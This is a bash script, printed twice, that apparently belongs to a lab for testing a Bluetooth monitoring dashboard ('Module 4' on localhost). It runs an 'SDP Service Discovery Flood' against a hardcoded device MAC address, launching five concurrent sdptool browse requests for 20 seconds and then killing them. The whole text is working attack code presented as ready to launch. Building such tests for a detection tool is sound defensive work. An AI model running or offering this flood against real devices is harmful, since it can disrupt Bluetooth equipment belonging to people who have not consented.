#!/bin/bash
################################################################################
# ATTACK 3: SDP SERVICE DISCOVERY FLOOD
# Status: NEW - READY TO TEST
# Severity: MEDIUM
# Duration: 20 seconds
################################################################################

TARGET="28:C6:3F:91:67:CE"

echo "=========================================="
echo "🟡 SDP Service Discovery Flood Attack"
echo "=========================================="
echo "Target: $TARGET"
echo "Duration: 20 seconds"
echo "Requests: 5 simultaneous"
echo ""

for i in {1..5}; do
    timeout 20 sdptool browse $TARGET &>/dev/null &
    echo "  [+] Launched SDP discovery request $i"
done

echo ""
echo "✅ Attack launched! Running for 20 seconds..."
sleep 20

pkill -9 sdptool
echo "✅ Attack completed!"
echo ""
echo "📱 Check Module 4: http://localhost:8000/module4"












################################################################################
# ATTACK 3: SDP SERVICE DISCOVERY FLOOD
# Status: NEW - READY TO TEST
# Severity: MEDIUM
# Duration: 20 seconds
################################################################################

TARGET="28:C6:3F:91:67:CE"

echo "=========================================="
echo "🟡 SDP Service Discovery Flood Attack"
echo "=========================================="
echo "Target: $TARGET"
echo "Duration: 20 seconds"
echo "Requests: 5 simultaneous"
echo ""

for i in {1..5}; do
    timeout 20 sdptool browse $TARGET &>/dev/null &
    echo "  [+] Launched SDP discovery request $i"
done

echo ""
echo "✅ Attack launched! Running for 20 seconds..."
sleep 20

pkill -9 sdptool
echo "✅ Attack completed!"
echo ""
echo "📱 Check Module 4: http://localhost:8000/module4"














